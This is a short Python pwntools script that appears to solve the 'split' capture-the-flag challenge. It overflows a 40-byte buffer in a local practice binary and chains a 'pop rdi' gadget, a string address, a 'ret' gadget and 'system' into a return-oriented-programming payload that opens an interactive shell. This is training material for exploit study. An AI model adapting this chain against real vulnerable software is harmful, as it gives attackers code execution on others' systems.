from pwn import *

p = process('./split')
e = ELF('./split')
r = ROP(e)

payload = b'A' * 40
payload += p64(r.find_gadget(['pop rdi']).address)
payload += p64(e.symbols['usefulString'])
payload += p64(r.find_gadget(['ret']).address)
payload += p64(e.symbols['system'])
p.send(payload)
p.interactive()
